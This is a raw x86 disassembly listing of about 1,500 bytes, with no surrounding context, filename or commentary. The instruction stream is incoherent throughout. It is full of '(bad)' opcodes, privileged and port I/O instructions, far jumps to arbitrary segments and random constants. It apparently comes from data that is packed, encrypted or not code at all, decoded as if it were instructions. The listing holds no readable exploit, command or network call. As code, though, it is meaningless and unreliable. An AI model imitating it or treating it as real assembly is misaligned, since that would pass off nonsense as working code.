  406232:	xor    eax,0xbf6c0bcc
  406237:	pushf  
  406238:	inc    esp
  406239:	mov    ds:0xf1ad69e3,al
  40623e:	dec    esp
  40623f:	div    ch
  406241:	sub    eax,0x77ddcd33
  406246:	(bad)  
  406247:	jmp    0x4061d9
  406249:	adc    BYTE PTR [eax],0xd5
  40624c:	pop    eax
  40624d:	fwait
  40624e:	gs int 0xaa
  406251:	push   esp
  406252:	pop    ebp
  406253:	or     ebx,DWORD PTR cs:[ecx-0x4b20218a]
  40625a:	sub    al,0x92
  40625c:	cld    
  40625d:	in     al,0x22
  40625f:	jno    0x4062bd
  406261:	or     DWORD PTR [edx],0xffffffee
  406264:	xchg   ecx,eax
  406265:	icebp  
  406266:	cmp    bl,ah
  406268:	(bad)  
  406269:	mov    DWORD PTR [ebx],eax
  40626b:	jbe    0x406270
  40626d:	in     eax,dx
  40626e:	cmp    ebp,esp
  406270:	or     DWORD PTR [edx+0x5f],0x2bbcbdce
  406277:	leave  
  406278:	mov    esi,0x26e6d62f
  40627d:	ins    DWORD PTR es:[edi],dx
  40627e:	pop    esi
  40627f:	or     DWORD PTR [eax],esp
  406281:	sar    DWORD PTR [edi+0x74],cl
  406284:	xchg   edx,eax
  406285:	(bad)  
  406286:	call   0x268f:0x80a31a2d
  40628d:	xor    al,0x8a
  40628f:	xor    BYTE PTR [eax-0xca9ba7c],cl
  406295:	mov    eax,0x402ccd2d
  40629a:	mov    al,0xea
  40629c:	add    bh,BYTE PTR ds:0x43f24b41
  4062a2:	add    eax,0xb8210ce0
  4062a7:	adc    edi,ebx
  4062a9:	mov    ah,al
  4062ab:	adc    al,BYTE PTR [ebx]
  4062ad:	mov    ds:0xefe54aa8,al
  4062b2:	loope  0x406299
  4062b4:	jb     0x406281
  4062b6:	xchg   bh,bh
  4062b8:	add    bl,BYTE PTR [ecx-0x6c]
  4062bb:	aas    
  4062bc:	mov    bh,0x76
  4062be:	dec    ecx
  4062bf:	btc    DWORD PTR [esp+ebx*1+0x7b],edi
  4062c4:	jg     0x40628f
  4062c6:	sbb    eax,0x44968087
  4062cb:	icebp  
  4062cc:	mov    DWORD PTR [ecx-0x23],ebp
  4062cf:	outs   dx,BYTE PTR ds:[esi]
  4062d0:	call   FWORD PTR [eax-0x59]
  4062d3:	jno    0x40633f
  4062d5:	push   0x20bfb3a
  4062da:	and    cl,BYTE PTR [esi-0x16f0bc9b]
  4062e0:	in     eax,dx
  4062e1:	out    dx,al
  4062e2:	ficomp WORD PTR [eax-0x36]
  4062e5:	(bad)  
  4062e6:	xor    DWORD PTR [edi-0x36],ebx
  4062e9:	out    0x33,eax
  4062eb:	ja     0x406330
  4062ed:	push   es
  4062ee:	js     0x406356
  4062f0:	retf   0xb0d3
  4062f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062f4:	and    edx,edx
  4062f6:	and    ah,BYTE PTR [eax+edx*8]
  4062f9:	into   
  4062fa:	bound  edi,QWORD PTR ds:0xe3c24af6
  406300:	shr    DWORD PTR [eax+0x3e],cl
  406303:	dec    ebx
  406304:	mov    ebx,0x290f4135
  406309:	push   esp
  40630a:	repnz xor ah,BYTE PTR [eax-0x3b]
  40630e:	bound  ecx,QWORD PTR [ebx]
  406310:	cmp    BYTE PTR [edi+0x1bb5b813],bl
  406316:	cwde   
  406317:	call   0x84f6:0x9921399b
  40631e:	jnp    0x4062d8
  406320:	popa   
  406321:	sbb    dh,bl
  406323:	mov    edx,0x42c49be4
  406328:	hlt    
  406329:	sub    bl,BYTE PTR [ebx+0x78]
  40632c:	jmp    0x40632f
  40632e:	adc    ah,BYTE PTR ds:0xf3a43e6a
  406334:	imul   edx,esp,0xffffffdb
  406337:	out    dx,eax
  406338:	sbb    ebx,DWORD PTR [edi+0x52]
  40633b:	inc    edx
  40633c:	fwait
  40633d:	cmp    DWORD PTR [ecx+0x42884b7c],eax
  406343:	data16 test al,0x6c
  406346:	jae    0x406334
  406348:	imul   ecx,DWORD PTR [ebp-0x46],0xffffffef
  40634c:	push   ebp
  40634d:	outs   dx,BYTE PTR ds:[esi]
  40634e:	xor    eax,0x89b5e681
  406353:	and    al,0x7b
  406355:	jae    0x406364
  406357:	inc    ebp
  406358:	cmp    DWORD PTR [eax],esp
  40635a:	(bad)  
  40635b:	aas    
  40635c:	shl    DWORD PTR [edi+0x235f9ed5],1
  406362:	mov    cl,0x92
  406364:	mov    ebx,edx
  406366:	jae    0x4063d0
  406368:	fstp   QWORD PTR [edx]
  40636a:	mov    edx,0x68dd8287
  40636f:	and    eax,0x84b26f61
  406374:	lahf   
  406375:	dec    edx
  406376:	outs   dx,DWORD PTR ds:[esi]
  406377:	sbb    edi,eax
  406379:	loopne 0x40634b
  40637b:	push   ss
  40637c:	out    0x4e,eax
  40637e:	inc    esp
  40637f:	and    esp,0xc03efcfc
  406385:	dec    ebp
  406386:	xchg   ebx,eax
  406387:	lods   eax,DWORD PTR ds:[esi]
  406388:	inc    esi
  406389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40638a:	add    cl,BYTE PTR ds:0x30f14fa6
  406390:	mov    eax,0x35d87331
  406395:	jno    0x4063e1
  406397:	sbb    esi,0xc9586a
  40639d:	and    al,0x2b
  40639f:	arpl   di,bp
  4063a1:	sbb    edx,ecx
  4063a3:	pushf  
  4063a4:	fiadd  WORD PTR [eax+0x7b]
  4063a7:	sub    al,0xee
  4063a9:	daa    
  4063aa:	xchg   DWORD PTR [eax-0x61],esp
  4063ad:	sub    esi,DWORD PTR [eax-0x2c]
  4063b0:	out    0x37,eax
  4063b2:	fisttp DWORD PTR [ebx+0x2f]
  4063b5:	ds mov ecx,0xf82b8ae1
  4063bb:	(bad)  
  4063bc:	fs xor edx,edx
  4063bf:	sti    
  4063c0:	fsubr  DWORD PTR [edx-0x80]
  4063c3:	enter  0xde1b,0x85
  4063c7:	sbb    BYTE PTR [edx+0x58],al
  4063ca:	xor    DWORD PTR [esi+0x3be68465],eax
  4063d0:	xchg   DWORD PTR [edi-0x7493446c],esp
  4063d6:	dec    esi
  4063d7:	adc    BYTE PTR [esi+eiz*4+0x54],0xd9
  4063dc:	in     al,dx
  4063dd:	pop    edx
  4063de:	loope  0x406435
  4063e0:	cmc    
  4063e1:	sbb    edi,DWORD PTR [esi]
  4063e3:	lods   eax,DWORD PTR ds:[esi]
  4063e4:	cwde   
  4063e5:	and    al,0x26
  4063e7:	push   cs
  4063e8:	adc    ecx,ebp
  4063ea:	push   cs
  4063eb:	ret    0xfd78
  4063ee:	jle    0x406436
  4063f0:	push   0x35
  4063f2:	push   es
  4063f3:	xlat   BYTE PTR ds:[ebx]
  4063f4:	sbb    edx,eax
  4063f6:	outs   dx,DWORD PTR gs:[esi]
  4063f8:	jbe    0x406464
  4063fa:	ror    edi,0x72
  4063fd:	rol    ecx,0xf4
  406400:	mov    ah,0xe4
  406402:	jns    0x40646f
  406404:	mov    ecx,0xeb9b2eaa
  406409:	xor    esi,esi
  40640b:	xchg   edx,eax
  40640c:	fs in  al,0x16
  40640f:	sub    bl,ch
  406411:	xchg   ebx,eax
  406412:	jae    0x4063e4
  406414:	test   ch,0x18
  406417:	dec    edx
  406418:	daa    
  406419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641a:	sub    al,0x53
  40641c:	jbe    0x406466
  40641e:	call   0x17df:0x9a773885
  406425:	bound  ebp,QWORD PTR [ebp+ebp*4-0x4d]
  406429:	loope  0x4063ea
  40642b:	mov    ah,0xf5
  40642d:	test   DWORD PTR [ebp+0x6],0xd9a95ec7
  406434:	mov    ecx,0x56f0c4d6
  406439:	jnp    0x40646b
  40643b:	imul   ebp,DWORD PTR [esi-0xeeeb33f],0x69
  406442:	inc    edx
  406443:	jb     0x4064b4
  406445:	fcomp  QWORD PTR [esi+0x1402117d]
  40644b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40644c:	xlat   BYTE PTR ds:[ebx]
  40644d:	and    eax,0x301d6490
  406452:	outs   dx,BYTE PTR ds:[esi]
  406453:	or     DWORD PTR [esp+edi*1],edi
  406456:	mov    ch,0x64
  406458:	je     0x4063e5
  40645a:	int    0x4f
  40645c:	sub    eax,0x5a9aeef4
  406461:	fsubr  DWORD PTR [ebx]
  406463:	and    bl,BYTE PTR [ebx+0x60fe78e0]
  406469:	jg     0x406498
  40646b:	sbb    dl,bh
  40646d:	pop    es
  40646e:	ret    0xf6d9
  406471:	out    dx,al
  406472:	dec    edi
  406473:	psrld  mm0,QWORD PTR [edi-0x3e]
  406477:	inc    eax
  406478:	jge    0x4064e9
  40647a:	jo     0x40648c
  40647c:	shr    BYTE PTR [ebx],0xb9
  40647f:	add    eax,0x4a406fa4
  406484:	es popa 
  406486:	aad    0x94
  406488:	mov    ebx,0x6bc96633
  40648d:	test   bl,0x8b
  406490:	cmp    DWORD PTR [edi-0x67298121],edx
  406496:	ficom  DWORD PTR [ecx+0x41]
  406499:	fsub   st,st(6)
  40649b:	xchg   edx,eax
  40649c:	test   al,0x58
  40649e:	adc    esp,ebx
  4064a0:	aam    0xb8
  4064a2:	or     ah,BYTE PTR [esi+edx*1-0x2a944577]
  4064a9:	arpl   WORD PTR [ebp-0x72632ccf],cx
  4064af:	mov    bh,0xfc
  4064b1:	and    DWORD PTR [esi],0xc0b78a61
  4064b7:	xor    eax,0x6ffad139
  4064bc:	mov    eax,0x2ca303b4
  4064c1:	ret    0x4f4c
  4064c4:	adc    DWORD PTR [ebx+0x7e1c067f],edx
  4064ca:	push   edx
  4064cb:	xchg   ecx,eax
  4064cc:	test   al,0xb9
  4064ce:	pop    edi
  4064cf:	inc    ebx
  4064d0:	je     0x40652e
  4064d2:	add    BYTE PTR [ecx+0x40],bh
  4064d5:	mov    edi,cs
  4064d7:	rcr    BYTE PTR [edi],cl
  4064d9:	sub    DWORD PTR [edx],edi
  4064db:	dec    edx
  4064dc:	mov    ah,0xd3
  4064de:	xor    DWORD PTR [edx-0x382a9c56],ebx
  4064e4:	and    DWORD PTR [edi],edx
  4064e6:	mov    BYTE PTR [ebx+0x5b],0x72
  4064ea:	ins    DWORD PTR es:[edi],dx
  4064eb:	pop    esi
  4064ec:	xchg   ebx,eax
  4064ed:	les    ebx,FWORD PTR ds:0x5d5f5710
  4064f3:	aas    
  4064f4:	enter  0xff2c,0x89
  4064f8:	mov    BYTE PTR [edi-0x4555ca4d],bl
  4064fe:	push   ss
  4064ff:	sar    ah,1
  406501:	ja     0x406537
  406503:	arpl   WORD PTR [ecx],dx
  406505:	shl    DWORD PTR [esi+0x2f],1
  406508:	xchg   ebx,eax
  406509:	jmp    0x8708:0x2a241992
  406510:	(bad)  
  406511:	outs   dx,DWORD PTR ds:[esi]
  406512:	fnstenv [edi-0x4399de98]
  406518:	inc    edi
  406519:	gs iret 
  40651b:	xor    ecx,DWORD PTR [esi]
  40651d:	scas   eax,DWORD PTR es:[edi]
  40651e:	xor    ecx,DWORD PTR [ecx+0x619f7317]
  406524:	sbb    eax,0x1f5e913c
  406529:	sahf   
  40652a:	inc    esi
  40652b:	scas   al,BYTE PTR es:[edi]
  40652c:	and    bl,BYTE PTR [esi-0x54c6b5cb]
  406532:	mov    dh,BYTE PTR [edi]
  406534:	(bad)  
  406536:	mov    DWORD PTR ds:0xfb06f19d,ebx
  40653c:	(bad)  
  40653d:	jmp    0xf2c4:0x396cab26
  406544:	ins    BYTE PTR es:[edi],dx
  406545:	sbb    eax,0xf414019c
  40654a:	icebp  
  40654b:	push   eax
  40654c:	in     eax,dx
  40654d:	je     0x40655a
  40654f:	xchg   ecx,eax
  406550:	dec    esi
  406551:	inc    eax
  406552:	adc    al,0x48
  406554:	mov    ds:0x9ecb3052,al
  406559:	jae    0x4065bb
  40655b:	ins    BYTE PTR es:[edi],dx
  40655c:	xor    BYTE PTR [ebx-0x1c4d420b],ah
  406562:	aam    0xf8
  406564:	push   esp
  406565:	dec    esi
  406566:	inc    esp
  406567:	mov    eax,ds:0x6581f085
  40656c:	(bad)  [eax+0x31]
  40656f:	lods   al,BYTE PTR ds:[esi]
  406570:	xor    al,0xad
  406572:	pop    edx
  406573:	loop   0x4065e7
  406575:	outs   dx,DWORD PTR ds:[esi]
  406576:	push   ds
  406577:	dec    ecx
  406578:	xchg   ebx,eax
  406579:	popa   
  40657a:	cmp    bh,BYTE PTR [edx]
  40657c:	scas   al,BYTE PTR es:[edi]
  40657d:	into   
  40657e:	mov    cl,BYTE PTR [ebx]
  406580:	rcl    ecx,cl
  406582:	lods   eax,DWORD PTR ds:[esi]
  406583:	je     0x406576
  406585:	push   ecx
  406586:	pop    ebp
  406587:	push   es
  406588:	jecxz  0x40659d
  40658a:	pop    ebp
  40658b:	add    eax,0x5cbcc21f
  406590:	int3   
  406591:	jecxz  0x4065b5
  406593:	jmp    0xe99e80bc
  406598:	mov    dl,0x14
  40659a:	mov    ebx,0x7e580762
  40659f:	mov    dh,0x6a
  4065a1:	mov    esp,0xdc4d9ee4
  4065a6:	int3   
  4065a7:	mov    esp,0x336ad4b4
  4065ac:	pop    esp
  4065ad:	xchg   ebp,eax
  4065ae:	inc    esp
  4065af:	fstp   st(1)
  4065b1:	out    0xc6,eax
  4065b3:	inc    esp
  4065b4:	push   ss
  4065b5:	adc    al,0x16
  4065b7:	pop    edx
  4065b8:	sub    DWORD PTR [esi],ebp
  4065ba:	mov    ecx,0xd2f12d15
  4065bf:	ja     0x40655a
  4065c1:	aam    0x69
  4065c3:	add    dh,bh
  4065c5:	adc    ebx,DWORD PTR [ebx]
  4065c7:	in     eax,0x8d
  4065c9:	push   cs
  4065ca:	mov    BYTE PTR [ebx],cl
  4065cc:	cmc    
  4065cd:	ds push ds
  4065cf:	sub    eax,0x1d3606f1
  4065d4:	adc    dl,BYTE PTR [ecx-0x7e142161]
  4065da:	sbb    ecx,DWORD PTR [ebp-0xb]
  4065dd:	add    cl,BYTE PTR [eax-0x17419d6a]
  4065e3:	xchg   DWORD PTR [esi],ebx
  4065e5:	or     edx,DWORD PTR [eax+eax*1+0x445849d9]
  4065ec:	mov    ebp,0x6e67a63d
  4065f1:	fisubr WORD PTR [esi+edi*8+0x649b3f9a]
  4065f8:	test   al,0x72
  4065fa:	nop
  4065fb:	push   ebx
  4065fc:	lods   eax,DWORD PTR ds:[esi]
  4065fd:	push   eax
  4065fe:	or     BYTE PTR [edx-0x35],dl
  406601:	push   0xee0c2b7e
  406606:	sub    cl,bl
  406608:	xor    BYTE PTR [ebp-0x351eda94],bl
  40660e:	rol    BYTE PTR [edi-0x1b1aff00],1
  406614:	xor    ah,BYTE PTR [ebp+0x432712a9]
  40661a:	jo     0x4065aa
  40661c:	mov    eax,DWORD PTR [eax]
  40661e:	dec    edi
  40661f:	pusha  
  406620:	add    DWORD PTR [edi-0x17],esi
  406623:	outs   dx,BYTE PTR ds:[esi]
  406624:	push   edi
  406625:	(bad)  
  406626:	daa    
  406627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406628:	xchg   esp,eax
  406629:	or     esi,0xd832f6ae
  40662f:	enter  0x6b89,0x91
  406633:	jecxz  0x40663f
  406635:	ins    DWORD PTR es:[edi],dx
  406636:	cwde   
  406637:	cmp    cl,BYTE PTR [ebx+0x9]
  40663a:	adc    dh,0xc7
  40663d:	daa    
  40663e:	cmc    
  40663f:	mov    ch,0x1d
  406641:	jns    0x40666c
  406643:	dec    edi
  406644:	gs fwait
  406646:	in     al,0x71
  406648:	aaa    
  406649:	(bad)  
  40664a:	jne    0x406608
  40664c:	rcr    DWORD PTR [edi+0x5e],0x87
  406650:	sub    DWORD PTR [edi-0x65],edi
  406653:	fst    QWORD PTR [ebp+0x36]
  406656:	das    
  406657:	pop    eax
  406658:	cs jb  0x406684
  40665b:	jge    0x40669b
  40665d:	adc    esi,DWORD PTR [edx+0x57867497]
  406663:	dec    eax
  406664:	in     al,0xc4
  406666:	(bad)  
  406667:	pop    ss
  406668:	pusha  
  406669:	mov    al,ds:0xc34eb232
  40666e:	loope  0x4066d1
  406670:	es pop ebx
  406672:	jbe    0x406656
  406674:	(bad)  
  406675:	(bad)  
  406676:	inc    esi
  406677:	dec    edx
  406678:	loope  0x4066d2
  40667a:	rcr    dl,0xf6
  40667d:	sahf   
  40667e:	mov    dh,0xfd
  406680:	pop    ecx
  406681:	std    
  406682:	pop    ebx
  406683:	fbstp  TBYTE PTR [eax+esi*4]
  406686:	aad    0xb4
  406688:	js     0x406666
  40668a:	push   esp
  40668b:	repnz mov edi,0x992cb2f2
  406691:	xor    cl,BYTE PTR [ebx-0x1b]
  406694:	cmp    eax,0x5fc2df85
  406699:	mov    sp,0x6646
  40669d:	lock (bad) [ebx+0x1946ac89]
  4066a4:	fdiv   st,st(3)
  4066a6:	jecxz  0x4066a9
  4066a8:	std    
  4066a9:	sub    esp,ecx
  4066ab:	leave  
  4066ac:	and    ebx,ebp
  4066ae:	mov    ch,0xb2
  4066b0:	push   ds
  4066b1:	xchg   esp,eax
  4066b2:	mov    BYTE PTR [eax-0x48],dh
  4066b5:	out    dx,eax
  4066b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b7:	mov    al,ds:0xc41a5ec3
  4066bc:	loop   0x4066b7
  4066be:	jns    0x4066be
  4066c0:	push   ds
  4066c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066c2:	push   es
  4066c3:	mov    edx,0xe8c7d917
  4066c8:	fucomi st,st(5)
  4066ca:	shl    DWORD PTR [ebx+0x5947f08e],cl
  4066d0:	jmp    0xddbaf4ae
  4066d5:	jne    0x4066dc
  4066d7:	inc    ecx
  4066d9:	popf   
  4066da:	(bad)  
  4066db:	arpl   WORD PTR [eax+esi*8+0x1f2d1b26],dx
  4066e2:	jnp    0x406741
  4066e4:	fsub   QWORD PTR [edi-0x60]
  4066e7:	mov    eax,0x3937bb22
  4066ec:	mov    ebx,0x5cb856ca
  4066f1:	imul   ebx,edi,0x2
  4066f4:	aaa    
  4066f5:	fisub  DWORD PTR [ebx+0x29]
  4066f8:	pop    ebp
  4066f9:	push   eax
  4066fa:	mov    DWORD PTR [ebx-0xe],eax
  4066fd:	pop    ebp
  4066fe:	shr    DWORD PTR [ebx-0x2b3e257b],1
  406704:	jne    0x406775
  406706:	mov    al,0xab
  406708:	or     edi,esp
  40670a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40670b:	dec    edx
  40670c:	cwde   
  40670d:	push   ss
  40670e:	cwde   
  40670f:	imul   esp,DWORD PTR [esi+0x26],0x24
  406713:	push   es
  406714:	leave  
  406715:	dec    edx
  406716:	sbb    ebp,DWORD PTR ds:0x4900a5df
  40671c:	rcl    dl,0xff
  40671f:	push   edi
  406720:	xchg   edi,eax
  406721:	sbb    BYTE PTR ds:[ebx],al
  406724:	jmp    0x89c6:0x2dec8d01
  40672b:	sahf   
  40672c:	shl    DWORD PTR [esi],0x68
  40672f:	xor    DWORD PTR [edi-0x67],esp
  406732:	inc    BYTE PTR [ecx-0xc7be047]
  406738:	clc    
  406739:	loop   0x4066fe
  40673b:	mov    BYTE PTR [ebx+0x5e],ch
  40673e:	push   ds
  40673f:	lods   al,BYTE PTR ds:[esi]
  406740:	loope  0x40672c
  406742:	dec    ecx
  406743:	or     eax,0x3066824
  406748:	pop    ds
  406749:	cmp    BYTE PTR [ebx+0x2715136c],0x9
  406750:	repz test DWORD PTR [esi+0x4b29ca03],edx
  406757:	fs ins BYTE PTR es:[edi],dx
  406759:	jo     0x406744
  40675b:	daa    
  40675c:	sub    bl,BYTE PTR [ebp+0x2c581c77]
  406762:	mov    eax,0x304b07e5
  406767:	mov    ds:0xf93ed84d,eax
  40676c:	mov    ebx,0x80d87cea
  406771:	push   ds
  406772:	mov    edx,0x57847519
  406777:	sub    bh,bh
  406779:	js     0x4067f0
  40677b:	ret    0x484c
  40677e:	outs   dx,DWORD PTR ds:[esi]
  40677f:	pop    esp
  406780:	adc    esp,DWORD PTR [eax-0x31e3977f]
  406786:	lahf   
  406787:	test   BYTE PTR [eax],0x77
  40678a:	dec    ecx
  40678b:	inc    ebx
  40678c:	inc    esi
  40678d:	lds    ebx,FWORD PTR [ebx-0x593065ee]
  406793:	adc    si,WORD PTR [edi+0x9a869a0]
  40679a:	scas   eax,DWORD PTR es:[edi]
  40679b:	out    0xa8,al
  40679d:	dec    ecx
  40679e:	xlat   BYTE PTR ds:[ebx]
  40679f:	cmp    BYTE PTR [eax],dl
  4067a1:	push   esp
  4067a2:	stos   BYTE PTR es:[edi],al
  4067a3:	(bad)  
  4067a4:	cmp    al,0x8c
  4067a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a7:	out    0xa7,al
  4067a9:	adc    esi,eax
  4067ab:	(bad)  
  4067ac:	sti    
  4067ad:	fsub   st,st(4)
  4067af:	sub    al,0xe3
  4067b1:	cmp    DWORD PTR [ebp-0x6c],ebp
  4067b4:	jmp    0x159:0x451bd5d8
  4067bb:	les    esp,FWORD PTR [esi+0x1f]
  4067be:	js     0x406835
  4067c0:	dec    ecx
  4067c1:	xor    al,0x3f
  4067c3:	lods   eax,DWORD PTR ds:[esi]
  4067c4:	xor    edi,edx
  4067c6:	inc    eax
  4067c7:	mov    ch,0xeb
  4067c9:	ins    DWORD PTR es:[edi],dx
  4067ca:	mov    ebx,DWORD PTR [edx+0x47]
  4067cd:	(bad)  
  4067ce:	adc    al,0x5e
  4067d0:	(bad)  
  4067d2:	pusha  
  4067d3:	xchg   bh,bl
  4067d5:	sbb    BYTE PTR [esi],0x3f
  4067d8:	ss in  al,dx
  4067da:	xchg   DWORD PTR [eax-0xfe7830f],eax
  4067e0:	push   ss
  4067e1:	adc    esp,esi
  4067e3:	xor    BYTE PTR [edi+0x9eea2be],ch
  4067e9:	pop    es
  4067ea:	sub    esp,DWORD PTR [edx-0x20]
  4067ed:	outs   dx,BYTE PTR ds:[esi]
  4067ee:	adc    DWORD PTR [edi],esp
  4067f0:	jmp    0x4067a4
  4067f2:	es cmp eax,0x136bae9f
  4067f8:	pop    eax
  4067f9:	shr    BYTE PTR [esi+0x32],cl
  4067fc:	mov    al,ds:0x1316aed6
  406801:	test   eax,0x1b204724
  406806:	aaa    
  406807:	hlt    
  406808:	bound  edi,QWORD PTR [ebx]
  40680a:	jmp    0x40680a
  40680c:	mov    dh,0x78
  40680e:	fs scas al,BYTE PTR es:[edi]
  406810:	sbb    ebx,DWORD PTR [ecx+0x63f6ee6c]
  406816:	or     esi,esp
  406818:	push   esi
  406819:	arpl   WORD PTR [edx+0x553aba3d],si
  40681f:	jo     0x40688d
  406821:	stc    
  406822:	in     al,dx
  406823:	push   ds
  406824:	(bad)  
  406825:	pop    eax
  406826:	add    eax,0xb262569d
  40682b:	data16 cld 
  40682d:	inc    ebp
  40682e:	and    al,0x38
  406830:	(bad)  
  406832:	add    eax,0x6d3e2291
  406837:	adc    DWORD PTR [ecx+0x11],edi
  40683a:	dec    ebx
  40683b:	lods   eax,DWORD PTR ds:[esi]
  40683c:	fs push esi
  40683e:	imul   edi,DWORD PTR ds:0x3685a911,0xffffff8a
  406845:	inc    ebp
  406846:	cli    
  406847:	mov    edi,0x9dff8ced
  40684c:	fcomp  DWORD PTR [eax+0x588bb791]
  406852:	fs cmp eax,0xbe2b6d90
  406858:	lock popf 
  40685a:	lods   al,BYTE PTR ds:[esi]
  40685b:	dec    BYTE PTR [ecx-0x3790b2b9]
  406861:	fistp  WORD PTR [ecx-0x186da90d]
  406867:	into   
  406868:	cmp    eax,edx
  40686a:	mov    bh,0x5d
  40686c:	add    al,0xc4
  40686e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40686f:	lea    ebp,[eax+0x5c]
  406872:	jge    0x4068d7
  406874:	punpcklwd mm6,DWORD PTR [esi]
  406877:	(bad)  
  406878:	cmp    ecx,DWORD PTR [edx+eiz*1+0x3]
  40687c:	mov    cs,eax
  40687e:	std    
  40687f:	jno    0x406893
  406881:	stos   DWORD PTR es:[edi],eax
  406882:	mov    cl,0x94
  406884:	ja     0x4068c7
  406886:	adc    edi,0xfa9d2d45
  40688c:	(bad)  
  40688d:	jecxz  0x406851
  40688f:	das    
  406890:	(bad)  
  406891:	shl    DWORD PTR [edx],1
  406893:	retf   0xb7ea
  406896:	hlt    
  406897:	jnp    0x4068a5
  406899:	jecxz  0x4068a2
  40689b:	add    al,0xd4
  40689d:	stos   DWORD PTR es:[edi],eax
  40689e:	sub    al,BYTE PTR [ebp+0x5a95386d]
  4068a4:	inc    eax
  4068a5:	inc    eax
  4068a6:	js     0x406890
  4068a8:	fistp  DWORD PTR [ebp-0x21e83855]
  4068ae:	aad    0x89
  4068b0:	inc    ebx
  4068b1:	sub    DWORD PTR [esi-0x670542be],0x38
  4068b8:	dec    esp
  4068b9:	enter  0x2616,0xe6
  4068bd:	mov    gs,edi
  4068bf:	fcmove st,st(1)
  4068c1:	sub    DWORD PTR [ebp-0x4e],ebp
  4068c4:	mov    ch,0x81
  4068c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c7:	(bad)
  4068cb:	loope  0x4068c4
  4068cd:	fiadd  WORD PTR [esi+0x30]
  4068d0:	mov    ebp,0x6234d241
  4068d5:	adc    ah,BYTE PTR [edi+0x18edc9fe]
  4068db:	stos   BYTE PTR es:[edi],al
  4068dc:	mov    ch,0x53
  4068de:	add    BYTE PTR [ecx],cl
  4068e0:	cdq    
  4068e1:	sub    eax,0x299febba
  4068e6:	test   esp,ebp
  4068e8:	adc    BYTE PTR [ecx-0x42],dh
  4068eb:	das    
  4068ec:	mov    ss,WORD PTR [esp+esi*2-0x49]
  4068f0:	mov    ds:0x76164439,eax
  4068f5:	push   ecx
  4068f6:	fst    QWORD PTR [ebp+0x20b38546]
  4068fc:	aaa    
  4068fd:	jno    0x4068dd
  4068ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406900:	fimul  DWORD PTR [ebx+0x1bc123ae]
  406906:	aaa    
  406907:	adc    DWORD PTR [edx],ecx
  406909:	xchg   BYTE PTR [eax+0x5ad91332],dl
  40690f:	fcom   QWORD PTR ds:0xa518df4a
  406915:	ret    0xa3cf
  406918:	dec    edx
  406919:	xchg   edx,eax
  40691a:	(bad)  
  40691b:	arpl   si,di
  40691d:	mov    edi,DWORD PTR [edx+0x21a9163c]
  406923:	adc    DWORD PTR [esi+0x5a94e35e],esi
  406929:	fcomp  DWORD PTR [ecx+0xd9d4a3b]
  40692f:	js     0x4068db
  406931:	add    BYTE PTR [ebp-0x4ff4ecc2],dl
  406937:	loop   0x4068d7
  406939:	lds    ecx,FWORD PTR [edx+0x19]
  40693c:	xor    al,0x1c
  40693e:	jp     0x406940
  406940:	jno    0x40696a
  406942:	loopne 0x40696b
  406944:	je     0x406981
  406946:	pop    eax
  406947:	pop    ebp
  406948:	dec    esi
  406949:	sub    DWORD PTR [ecx+0x2e6ae3c9],edi
  40694f:	loop   0x4068e7
  406951:	push   ebx
  406952:	mov    edx,0x5206e71b
  406957:	mov    bl,0xf2
  406959:	mov    ds:0x3ef2034f,al
  40695e:	dec    esi
  40695f:	pushf  
  406960:	sub    al,0x8b
  406962:	imul   ebp,eax,0x2
  406965:	in     eax,0x63
  406967:	and    BYTE PTR [edi+0x313fe68f],0xc0
  40696e:	pusha  
  40696f:	dec    edx
  406970:	jnp    0x40695c
  406972:	jge    0x406920
  406974:	rcr    ecx,0x99
  406977:	pop    ecx
  406978:	jmp    FWORD PTR [esi+0x6a1af969]
  40697e:	inc    ah
  406980:	push   edx
  406981:	test   al,0x31
  406983:	xor    BYTE PTR [ebp+0x6d2cca84],bh
  406989:	(bad)  [eax]
  40698b:	adc    eax,DWORD PTR [ecx-0x5dd48e0f]
  406991:	xchg   DWORD PTR cs:[ebx+0x2428703a],ebp
  406998:	add    esi,esi
  40699a:	leave  
  40699b:	or     dh,BYTE PTR [ebx+0x7cac9d27]
  4069a1:	mov    dh,0x18
  4069a3:	(bad)  
  4069a4:	into   
  4069a5:	daa    
  4069a6:	imul   edi,DWORD PTR [ecx-0x68ed4ecb],0xb31ddb7b
  4069b0:	loope  0x406989
  4069b2:	pop    ebp
  4069b3:	or     eax,0x8a6c4c93
  4069b8:	mov    DWORD PTR ds:0x4958194a,edx
  4069be:	sub    DWORD PTR [eax-0xd],eax
  4069c1:	retf   0x9b84
  4069c4:	pop    ebx
  4069c5:	push   eax
  4069c6:	jmp    0x406a17
  4069c8:	xchg   BYTE PTR [edi-0x11cf50bf],bl
  4069ce:	cdq    
  4069cf:	mov    ch,0xeb
  4069d1:	out    0xb2,al
  4069d3:	fucomp st(6)
  4069d5:	stos   BYTE PTR es:[edi],al
  4069d6:	leave  
  4069d7:	jmp    0x4069ab
  4069d9:	mov    bl,0xcb
  4069db:	jns    0x406977
  4069dd:	jo     0x4069de
  4069df:	sub    al,BYTE PTR [ebx]
  4069e1:	lds    ecx,FWORD PTR [edx]
  4069e3:	sahf   
  4069e4:	ja     0x406a28
  4069e6:	daa    
  4069e7:	sbb    al,0x89
  4069e9:	cmp    eax,0x487c5fa2
  4069ee:	dec    eax
  4069ef:	hlt    
  4069f0:	pop    ebx
  4069f1:	and    DWORD PTR [edi],0x36a180de
  4069f7:	je     0x406988
  4069f9:	add    al,0x8b
  4069fb:	sub    edx,eax
  4069fd:	cli    
  4069fe:	xchg   ecx,eax
  4069ff:	cld    
  406a00:	daa    
  406a01:	lock popf 
  406a03:	aaa    
  406a04:	mov    ds:0x4a1aa26d,eax
  406a09:	pop    ecx
  406a0a:	cld    
  406a0b:	frstor [ebx+0x6aaabd02]
  406a11:	loop   0x4069c0
  406a13:	dec    esi
  406a14:	xchg   esp,eax
